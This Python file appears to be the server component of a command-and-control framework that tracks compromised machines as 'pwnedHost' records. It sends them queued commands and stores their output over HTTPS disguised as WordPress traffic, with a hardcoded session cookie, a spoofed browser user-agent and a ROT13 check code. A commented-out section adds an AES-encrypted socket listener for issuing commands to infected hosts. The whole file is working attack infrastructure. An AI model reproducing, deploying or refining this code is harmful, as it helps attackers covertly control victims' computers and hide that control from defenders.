from http.server import *
import random
import string
import ssl
from command_control.models import pwnedHost


class Server_Response(BaseHTTPRequestHandler):

    # chars = string.ascii_letters + string.digits
    # session_value = ''.join(random.choice(chars) for i in range(20))
    global session_value, user_agent, value
    session_value = "6Q2HydryJknyIyyVv8Om"
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
    trantab = str.maketrans("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz",
                            "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
    value = session_value.translate(trantab)

    def set_attributes(self):
        global ip
        global host
        ip = self.client_address[0]
        if pwnedHost.objects.filter(ip=ip):
            host = pwnedHost.objects.get(ip=ip)
        else:
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = post_data.decode('utf-8')
            except:
                pass
            host = pwnedHost(author=author, ip=ip, username="")
            host.save()

    def set_headers(self):
        self.send_response(200, "ok")
        self.send_header('Content-type', 'text/html')
        self.send_header('Set-Cookie',session_value)
        # self.send_header('Server', 'Microsoft IIS/7.5')
        self.end_headers()

    def unauth_set_headers(self):
        self.send_response(403, "forbidden")
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    # Allow GET
    def do_GET(self):

        self.set_attributes()

        global URI, cookie, agent
        print(self.headers)
        try:
            URI = self.raw_requestline.decode().split(" ")[1]
            cookie = self.headers['Cookie'].split(" = ")[-1]
            agent = self.headers['User-agent']
        except:
            pass

        message = host.cmd[6:]
        print(host.cmd)

        if URI == "/wp-post.php" and cookie == session_value and agent == user_agent:
            self.set_headers()
            if message:
                self.wfile.write(bytes(message, 'utf8'))
                host.cmd = ""
                host.save()
        else:
            self.unauth_set_headers()
            msg = " You are not authorized. Your access is forbidden."
            self.wfile.write(msg.encode('utf-8'))


    # Allow POST
    def do_POST(self):
        self.set_attributes()
        global URI, cookie, agent
        try:
            URI = self.raw_requestline.decode().split(" ")[1]
            cookie = self.headers['Cookie'].split(" = ")[-1]
            agent = self.headers['User-agent']
        except:
            pass

        if URI == "/wp-admin/admin-ajax.php" and cookie == session_value and agent == user_agent:
            self.set_headers()
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = post_data.decode('utf-8')
            data_len = int(len(data) - 20)

            if data[-20:] != str(value):
                print("The verification code %s was not received" %value)

            if data:
                host.result = data[:data_len] + "\n\n" + "THE VERIFICATION CODE WAS NOT RECEIVED : " + data[-20:]
                host.save()

        else:
            self.unauth_set_headers()
            msg = " You are not authorized. Your access is forbidden."
            self.wfile.write(msg.encode('utf-8'))




def run(auth_user, ip , port, enc_key):
    global author
    global secret
    global cipher
    secret = enc_key
    author = auth_user
    global Server_Response
    print("Server Started ..!!")
    server_address = (ip, port)
    httpd = HTTPServer(server_address, Server_Response)
    # httpd.socket = ssl.wrap_socket (httpd.socket, certfile='server.cert', keyfile='server.key', server_side=True)
    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='server.cert', keyfile="server.key", server_side=True)
    print('running server...')
    httpd.serve_forever()


"""

from Crypto.Cipher import AES
import time
from command_control.models import pwnedHost
import socket
import base64
import os
import threading
from multiprocessing import Process


lock = threading.Lock()
BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
iv = os.urandom(16)


def create_socket(user, interface, port, encryption_key):
    try:
        global s
        global sock
        global author
        global secret
        global cipher
        secret = encryption_key
        cipher = AES.new(secret, AES.MODE_CFB, iv)
        interface = interface
        port = port
        author = user
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((interface, port))
        s.listen(10)
    except socket.error as error_message:
        print(" Failed to Bind to " + str(interface) + ":" + str(port) + ":" + str(error_message))
        print("Retrying ..!!")
        time.sleep(5)
        create_socket(author, interface, port)


def thread_sock_connect():
    t = threading.Thread(target=sock_connect())
    t.start()


def sock_connect():
    global connect
    global ip_addr
    try:
        print(threading.current_thread().name)
        connect, ip_addr = s.accept()
        print("connection from %s:%s \n" % (ip_addr[0], ip_addr[1]))
        print("\n")
        user = connect.recv(1024)
        host = pwnedHost(author= author, ip=ip_addr[0], port=ip_addr[1], username= user)
        host.save()
    except socket.error as error_message:
        print(" Failed to Connect..!! " + str(error_message))


def command_control(command, id, ip_address):
    host = pwnedHost.objects.get(id=id, ip=ip_address)
    try:
        encrypted = EncodeAES(cipher, command)
        connect.sendto(encrypted,(host.ip,host.port))
        result = connect.recv(16384)
        return DecodeAES(cipher,result)
    except:
        host.delete()

"""


